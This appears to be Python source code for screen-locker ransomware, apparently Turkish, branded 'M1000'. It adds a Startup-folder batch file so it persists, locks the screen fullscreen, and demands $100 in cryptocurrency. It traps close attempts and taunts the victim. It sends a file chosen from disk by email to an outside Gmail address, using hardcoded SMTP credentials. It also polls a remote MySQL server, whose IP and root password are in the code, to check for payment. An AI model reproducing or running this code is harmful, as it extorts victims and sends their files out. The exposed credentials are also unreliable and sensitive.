from calendar import c
from tkinter.font import Font
import pyautogui,random,smtplib,time,os
from tkinter import Tk, Entry, Label
from tkinter import messagebox
import tkinter.filedialog as fd
from pyautogui import click, moveTo
from tkinter import *
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.utils import formatdate
from email import encoders
from requests import get
import mysql.connector
import webbrowser,sys,os,getpass,datetime,time

sistem = os.name
USER_NAME = getpass.getuser()
file_path=""

if sistem == "nt":
        file_path = "C:/Users/"+USER_NAME+"/Desktop"
        if file_path == "":
                file_path = os.path.realpath(__file__)
        bat_path = r'C:/Users/{}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'.format(USER_NAME)
        with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
                bat_file.write(r'start "" "{}"'.format(file_path))
else:
        pass


try:             
        window = Tk()
        pyautogui.FAILSAFE = False
        width = window.winfo_screenwidth()
        height = window.winfo_screenheight()
        window.title("M1000 Hacked")
        window.attributes("-fullscreen",True)

        entry = Entry(window, font = 1, fg = "white")
        entry.place(relx=0.5, rely=0.5, anchor=CENTER)

        label1 = Label(window, text="BUNDAN KURTULMAK İSTİYORSAN 100$ EŞDEĞERİNDE BTC/ETH GÖNDER!\n\nYOUR_BTC ADDRESS \n\nÖDEME DEKONTUNU GÖNDERMEK İÇİN 66 YAZ! ", font ="Arial 17 bold",bg="white",fg="black")
        label1.place(relx=0.5, rely=0.2, anchor=N)

        #label0 = Label(window,text="HACKED BY M1000", font=1,fg="black")#DON'T FORGET TO SIGN:)
        #label0.place(relx=0.5, rely=0.6, anchor=N)


        label01 = Label(window,text="𝓖𝓸𝓸𝓭 𝓛𝓾𝓬𝓴", font=1,fg="pink")
        label01.place(relx=0.5, rely=0.8, anchor=N)



        label10 = Label(window, text="YARDIM ET!\n YAZ--> 12", font ="Arial 20 bold",fg="black")
        label10.place(relx=0.5, rely=0.9, anchor=N)


        window.update()
        time.sleep(0.2)
        click(width/2, height/2)
        

        def altf4(event):
                liste=['HADİ AMA! BUKADAR APTAL OLAMAZSIN?','O KADAR KOLAY DEĞİL!','APTALMISIN?','BOŞUNA UĞRAŞMA!','KOMİK ÇOCUK SENİ']
                liste = random.choice(liste)
                messagebox.showinfo("M1000", liste)
        def callback(event):
                global k, entry
                if entry.get()   ==    "lRArsjH5qdpHsk68KQXMdvqAczshFtlbF":
                        messagebox.showinfo("M1000","Oh... Güzel!\nKENDİNE İYİ BAK👁")
                        k = True
                        toaddr = "gamingkafalartv27@gmail.com"
                        subject = "PROTON RANSOM | ÖDEME ALINDI"
                        message = "Hedef Cihazdan Ödeme Alındı. Proton İle Alakalı Her Şey Silindi."
                        content = 'Subject: {0}\n,{1}'.format(subject, message)
                        mail = smtplib.SMTP('smtp.gmail.com', 587)
                        mail.ehlo()
                        mail.starttls()
                        mail.login("alicesoftware.tr@gmail.com", "kynorwxsodsndndu")
                        mail.sendmail("alicesoftware.tr@gmail.com", toaddr, content)
                        mail.close()
                        sys.exit()

                        
                if entry.get()=="12":
                        messagebox.showinfo("M1000","CONTACT ME ON DİSCORD\nM1000#8093")
                        
                if entry.get()=="10":
                        webbrowser.open('')
                if entry.get()=="66":
                        currdir = os.getcwd()
                        tempdir = fd.askopenfilename(parent=window, initialdir= "/", title='DOSYA KONUMU SEÇ')
                        msg = MIMEMultipart()
                        messagebox.showinfo("M1000","ÖDEME DEKONTU GÖNDERİLDİ!\nÖDEME DOĞRULANDIĞINDA SANA ÖZEL KODU GÖNDERECEĞİZ!")
                        msg['From'] = "alicesoftware.tr@gmail.com"
                        msg['To'] = "gamingkafalartv27@gmail.com"
                        msg['Date'] = formatdate(localtime = True)
                        msg['Subject'] ="PROTON RANSOM | ÖDEME DEKONTU"
                        msg.attach(MIMEText("BTC/ETH Ödeme Dekontu"))
                        part = MIMEBase('application', "octet-stream")
                        part.set_payload(open(tempdir, "rb").read())
                        encoders.encode_base64(part)
                        part.add_header('Content-Disposition', 'attachment; filename="{}"'.format(tempdir))
                        msg.attach(part)
                        smtp = smtplib.SMTP("smtp.gmail.com", 587)
                        smtp.starttls()
                        smtp.login('alicesoftware.tr@gmail.com',"kynorwxsodsndndu")
                        smtp.sendmail("alicesoftware.tr@gmail.com", "gamingkafalartv27@gmail.com", msg.as_string())
                        smtp.quit()
                        while True:
                                        cnx = mysql.connector.connect(user = 'root', password = 'pyzhyc-gygBic-6hobso', host='91.151.88.110', database='AliceDataBase')
                                        cursor = cnx.cursor() 
                                        query = ("SELECT askupdate, message FROM updater")
                                        cursor.execute(query)
                                        for (askupdate,message) in cursor:
                                                yanit = askupdate
                                                mesaj = message
                                                if yanit == "SUCCESS":
                                                        label01 = Label(window,text="ÖDEME BAŞARILI OLDU!", font=1,fg="pink")
                                                        label01.place(relx=0.5, rely=0.6, anchor=N)
                                                        window.update()
                                                        messagebox.showinfo("M1000","ÖDEME İÇİN TEŞEKKÜR EDERİZ:) \n\nKODUNUZ: lRArsjH5qdpHsk68KQXMdvqAczshFtlbF")
                                                        cursor = cnx.cursor()
                                                        cursor.execute("SELECT askupdate, message FROM updater")
                                                        data = cursor.fetchone()
                                                        sql1 = "UPDATE updater SET askupdate ='NONE'"
                                                        cursor.execute(sql1)
                                                        cnx.commit()
                                                        entry.get()==""
                                                        break
                                                else:
                                                        pass
                                        label01 = Label(window,text="DEKONT DOĞRULAMASI BEKLENİYOR\n●••••", font=1,fg="red")
                                        label01.place(relx=0.5, rely=0.6, anchor=N)
                                        window.update()
                                        time.sleep(1)
                                        label01.destroy()
                                        label01 = Label(window,text="DEKONT DOĞRULAMASI BEKLENİYOR\n•●•••", font=1,fg="red")
                                        label01.place(relx=0.5, rely=0.6, anchor=N)
                                        window.update()
                                        time.sleep(1)
                                        label01.destroy()
                                        label01 = Label(window,text="DEKONT DOĞRULAMASI BEKLENİYOR\n••●••", font=1,fg="red")
                                        label01.place(relx=0.5, rely=0.6, anchor=N)
                                        window.update()
                                        time.sleep(1)
                                        label01.destroy()
                                        label01 = Label(window,text="DEKONT DOĞRULAMASI BEKLENİYOR\n•••●•", font=1,fg="red")
                                        label01.place(relx=0.5, rely=0.6, anchor=N)
                                        window.update()
                                        time.sleep(1)
                                        label01.destroy()
                                        label01 = Label(window,text="DEKONT DOĞRULAMASI BEKLENİYOR\n••••●", font=1,fg="red")
                                        label01.place(relx=0.5, rely=0.6, anchor=N)
                                        window.update()
                                        time.sleep(1)
                                        label01.destroy()

                else:
                        pass



                                


                
                
        def quit():
                exit()
                
                
        def on_closing():
                click(width/2, height/2)
                moveTo(width/2,height/2)
                window.attributes("-fullscreen", True)
                window.protocol("WM_DELETE_WİNDOW", on_closing)
                window.update()


                window.bind("<Control-KeyPress-c>",callback)
                window.bind("<Control-KeyPress-p>",callback)
                window.bind("<Return>",callback)


                window.bind("<Alt-KeyPress-F4>",altf4)
                window.bind("<Alt-KeyPress-Tab>",altf4)



        k = False 
        while not k:
           on_closing()

except:
        os.execl(sys.executable, os.path.abspath(__file__), *sys.argv) # IF WE RECEIVE AN ERROR, THE APPLICATION WILL RESTART.
        

